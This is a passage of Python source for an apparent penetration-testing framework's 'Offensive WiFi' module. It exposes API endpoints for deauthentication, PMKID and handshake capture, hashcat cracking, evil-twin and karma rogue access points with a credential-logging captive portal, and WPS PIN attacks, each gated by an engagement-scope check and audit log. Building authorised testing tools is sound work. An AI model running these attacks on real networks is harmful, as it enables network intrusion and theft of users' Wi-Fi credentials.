#   - karma:     target=""      -> engagement-active check + audit only (no
#     per-target scope check; karma is promiscuous by design). An empty target
#     means runner.submit still refuses when engagement is OFF (recording a
#     scope.violation) but skips the allowlist match.
# --------------------------------------------------------------------------- #
async def _launch_rogue_ap(
    *, op: str, type_: str, ssid: str | None, target: str, channel: int,
    duration: int, karma: bool, portal: bool,
) -> dict[str, Any]:
    stamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
    slug = _ssid_slug(ssid) if ssid else "all-probes"
    apdir = _ap_dir()
    dnsmasq_conf = apdir / f"{op}-{slug}-{stamp}.dnsmasq.conf"
    portal_py = apdir / f"{op}-{slug}-{stamp}.portal.py" if portal else None
    eid = engagement.engagement_id or "unengaged"
    creds_log = get_settings().engagement_dir() / eid / f"creds-{slug}-{stamp}.log"

    # Only materialise assets for an op the gate would allow, so a doomed
    # (engagement-off / out-of-scope) request never writes config or starts an AP.
    # _submit_gated flips the radio to monitor on the same condition.
    if _would_allow(target):
        missing = _ap_tools_missing()
        if missing:
            raise HTTPException(503, f"required AP tool(s) not installed: {', '.join(missing)}")
        dnsmasq_conf.write_text(_dnsmasq_conf(portal=portal))
        if portal and portal_py is not None:
            creds_log.parent.mkdir(parents=True, exist_ok=True)
            portal_py.write_text(_portal_script(creds_log=creds_log, ssid=ssid or ""))

    airbase_argv = _airbase_args(ssid=ssid, channel=channel, karma=karma)
    argv = _rogue_ap_command(
        airbase_argv=airbase_argv, dnsmasq_conf=dnsmasq_conf,
        portal_py=portal_py, duration=duration,
    )
    if karma:
        note = f"karma/MANA (all-probes) ch={channel} dur={duration}s portal={portal}"
    else:
        note = f"evil-twin ssid={ssid!r} ch={channel} dur={duration}s portal={portal}"
    # needs_monitor defaults True: airbase-ng requires the mon0 monitor iface.
    job_id = await _submit_gated(type_, argv, target=target, note=note)
    out: dict[str, Any] = {
        "ok": True, "op": op, "job_id": job_id, "target": target,
        "dnsmasq_conf": dnsmasq_conf.as_posix(),
        "argv": argv,
    }
    if portal:
        out["creds_log"] = creds_log.as_posix()
    return out


# --------------------------------------------------------------------------- #
# Module
# --------------------------------------------------------------------------- #
class Module(ModuleBase):
    id = "wifi_offensive"
    label = "Offensive WiFi"
    icon = "⚠"
    requires_engagement = True
    requires_root = True

    async def on_shutdown(self) -> None:
        try:
            await _restore_managed()
        except Exception:  # noqa: BLE001
            log.exception("wifi_offensive shutdown restore failed")

    def router(self) -> APIRouter:
        r = APIRouter(prefix=f"/api/{self.id}", tags=[self.id])

        @r.get("/status")
        def status() -> dict[str, Any]:
            return {
                "ok": True,
                "module": self.id,
                "label": self.label,
                "requires_engagement": self.requires_engagement,
                "engaged": engagement.is_on(),
                "engagement": engagement.status(),
                "iface": {"managed": WLAN_IFACE, "monitor": MON_IFACE},
                "ops": ["deauth", "pmkid", "handshake", "crack", "evil_twin", "karma", "wps"],
                "deferred": TODO_ITEMS,
                "captures": _list_captures(),
                "wordlists": _list_wordlists(),
                "recent_jobs": _recent_jobs(limit=10),
            }

        @r.get("/captures")
        def captures() -> dict[str, Any]:
            caps = _list_captures()
            return {"ok": True, "captures": caps, "count": len(caps)}

        @r.get("/jobs")
        def jobs(limit: int = 50) -> dict[str, Any]:
            limit = max(1, min(500, int(limit)))
            rows = _recent_jobs(limit=limit)
            return {"ok": True, "jobs": rows, "count": len(rows)}

        # ----- MVP op 1: deauth -------------------------------------------- #
        @r.post("/deauth")
        async def deauth(body: DeauthBody) -> dict[str, Any]:
            bssid = _norm_mac(body.bssid, "bssid")
            client = _norm_mac(body.client, "client") if body.client else None
            argv = _deauth_command(bssid=bssid, client=client, count=body.count, pps=body.pps)
            job_id = await _submit_gated(
                "wifi.deauth", argv, target=bssid,
                note=f"deauth ap={bssid} client={client or '*'} count={body.count}",
            )
            return {"ok": True, "op": "deauth", "job_id": job_id, "target": bssid, "argv": argv}

        # ----- MVP op 2: PMKID capture ------------------------------------- #
        @r.post("/pmkid")
        async def pmkid(body: PmkidBody) -> dict[str, Any]:
            bssid = _norm_mac(body.bssid, "bssid")
            stamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
            base = bssid.replace(":", "")
            cdir = _captures_dir()
            pcapng = cdir / f"pmkid-{base}-{stamp}.pcapng"
            hc22000 = cdir / f"pmkid-{base}-{stamp}.hc22000"
            filterfile = cdir / f"pmkid-{base}-{stamp}.filter"
            potfile = cdir / "wifi.potfile"
            wordlist = _resolve_wordlist(body.wordlist) if body.auto_crack else None
            # Only materialise the hcxdumptool filterlist for an allowed op.
            if _would_allow(bssid):
                filterfile.write_text(f"{bssid}\n")
            argv = _pmkid_command(
                bssid=bssid, filterfile=filterfile, pcapng=pcapng, hc22000=hc22000,
                duration=body.duration, auto_crack=body.auto_crack,
                wordlist=wordlist, potfile=potfile,
            )
            job_id = await _submit_gated(
                "wifi.pmkid", argv, target=bssid,
                note=f"pmkid ap={bssid} dur={body.duration}s auto_crack={body.auto_crack}",
            )
            return {
                "ok": True, "op": "pmkid", "job_id": job_id, "target": bssid,
                "pcapng": pcapng.as_posix(), "hc22000": hc22000.as_posix(),
                "auto_crack": body.auto_crack, "argv": argv,
            }

        # ----- MVP op 3: handshake forcer ---------------------------------- #
        @r.post("/handshake")
        async def handshake(body: HandshakeBody) -> dict[str, Any]:
            bssid = _norm_mac(body.bssid, "bssid")
            client = _norm_mac(body.client, "client") if body.client else None
            stamp = datetime.utcnow().strftime("%Y%m%d-%H%M%S")
            base = bssid.replace(":", "")
            prefix = _handshakes_dir() / f"hs-{base}-{stamp}"
            argv = _handshake_command(
                bssid=bssid, channel=body.channel, prefix=prefix, client=client,
                duration=body.duration, deauth_count=body.deauth_count,
            )
            job_id = await _submit_gated(
                "wifi.handshake", argv, target=bssid,
                note=f"handshake ap={bssid} ch={body.channel} dur={body.duration}s",
            )
            return {
                "ok": True, "op": "handshake", "job_id": job_id, "target": bssid,
                "prefix": prefix.as_posix(), "argv": argv,
            }

        # ----- MVP op 4: crack queue --------------------------------------- #
        @r.post("/crack")
        async def crack(body: CrackBody) -> dict[str, Any]:
            if body.mode not in CRACK_MODES:
                raise HTTPException(400, f"unsupported hashcat mode {body.mode!r}; choose {sorted(CRACK_MODES)}")
            hashpath = Path(body.hashfile)
            if not (_contained(hashpath, _captures_dir()) or _contained(hashpath, _handshakes_dir())):
                raise HTTPException(400, "hashfile must live under the captures/ or handshakes/ data dirs")
            wordlist = _resolve_wordlist(body.wordlist)
            potfile = _captures_dir() / "wifi.potfile"
            outfile = _captures_dir() / f"{hashpath.stem}.cracked"
            # Cracking is offline; the natural scope target is the source network.
            raw_target = (body.target or "").strip()
            target = _norm_mac(raw_target, "target") if _MAC_RE.match(raw_target) else raw_target
            argv = _crack_command(
                hashfile=hashpath, wordlist=wordlist, mode=body.mode,
                potfile=potfile, outfile=outfile,
            )
            job_id = await _submit_gated(
                "wifi.crack", argv, target=target,
                note=f"crack {hashpath.name} wordlist={wordlist.name} mode={body.mode}",
                needs_monitor=False,  # offline — never flips the radio
            )
            return {
                "ok": True, "op": "crack", "job_id": job_id, "target": target,
                "hashfile": hashpath.as_posix(), "wordlist": wordlist.as_posix(),
                "outfile": outfile.as_posix(), "argv": argv,
            }

        # ----- Op 5: evil twin + captive portal (airbase-ng) --------------- #
        @r.post("/evil_twin")
        async def evil_twin(body: EvilTwinBody) -> dict[str, Any]:
            ssid = _norm_ssid(body.ssid)
            return await _launch_rogue_ap(
                op="evil_twin", type_="wifi.evil_twin", ssid=ssid, target=ssid,
                channel=body.channel, duration=body.duration,
                karma=False, portal=True,
            )

        # ----- Op 6: karma / MANA (airbase-ng -P) -------------------------- #
        # Promiscuous (no target SSID) -> gated on engagement-active only.
        @r.post("/karma")
        async def karma(body: KarmaBody) -> dict[str, Any]:
            return await _launch_rogue_ap(
                op="karma", type_="wifi.karma", ssid=None, target="",
                channel=body.channel, duration=body.duration,
                karma=True, portal=False,
            )

        # ----- Op 7: WPS PIN attack (reaver / bully) ----------------------- #
        # Targets a single in-scope AP's WPS PIN, so it keeps the full scope gate
        # (target=<bssid>) exactly like deauth/handshake — routed through
        # _submit_gated, so engagement-off / out-of-scope both refuse 403 + log a
        # scope.violation, and every accepted run is audited.
        @r.post("/wps")
        async def wps(body: WpsBody) -> dict[str, Any]:
            bssid = _norm_mac(body.bssid, "bssid")  # validate BSSID BEFORE the gate
            tool = (body.tool or "").strip().lower()
            if tool not in WPS_TOOLS:
                raise HTTPException(
                    400, f"unsupported wps tool {body.tool!r}; choose {sorted(WPS_TOOLS)}"
                )
            # Only probe tool presence for an op the gate would allow, so tool
            # state never leaks to an unauthorised caller (mirrors the rogue-AP
            # 503 path). _submit_gated stays the authoritative gate below.
            if _would_allow(bssid) and _wps_tool_missing(tool):
                raise HTTPException(503, f"required WPS tool not installed: {tool}")
            argv = _wps_command(
                tool=tool, bssid=bssid, channel=body.channel,
                pixie_dust=body.pixie_dust, duration=body.duration,
            )
            job_id = await _submit_gated(
                "wifi.wps", argv, target=bssid,
                note=(
                    f"wps {tool} ap={bssid} ch={body.channel} "
                    f"pixie_dust={body.pixie_dust} dur={body.duration}s"
                ),
            )
            return {
                "ok": True, "op": "wps", "job_id": job_id, "target": bssid,
                "tool": tool, "pixie_dust": body.pixie_dust, "argv": argv,
            }

        # ----- Deferred op: clear 501 stub (still engagement-gated module) -- #
        # TODO(wave-3+): implement the WPA-Enterprise harvester. When built it
        # MUST route through ``_submit_gated`` exactly like the ops above so the
        # engagement gate + audit trail apply uniformly.
        #   - WPA-Enterprise harvester (eaphammer, EAP-MSCHAPv2 capture)
        @r.post("/eaphammer")
        def eaphammer() -> dict[str, Any]:
            raise HTTPException(501, "WPA-Enterprise harvester (eaphammer) not implemented in MVP (deferred)")

        return r


TODO_ITEMS: list[str] = [
    "WPA-Enterprise harvester (eaphammer, EAP-MSCHAPv2 capture)",
    "Auto-enqueue crack on capture completion (job-completion wiring)",
]
